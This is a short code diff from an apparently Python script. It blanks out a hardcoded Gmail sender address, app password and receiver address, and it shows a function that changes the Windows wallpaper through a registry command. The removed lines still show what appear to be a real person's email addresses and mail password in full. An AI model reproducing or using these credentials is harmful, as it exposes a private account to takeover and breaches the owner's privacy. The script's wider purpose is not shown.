@@ -20,9 +20,9 @@ from urllib.request import urlopen
 
 
 #MODIFY THESE STRINGS WITH YOUR CREDENTIALS
-email_sender = 'ykrmdmr0610@gmail.com'
-email_password = 'owfylyohqtofvjvg'
-email_receiver = 'yagizkeremdemir@gmail.com'
+email_sender = ''
+email_password = ''
+email_receiver = ''
 
 def bg():
     os.system('start cmd /k reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "bg.bmp" /f')
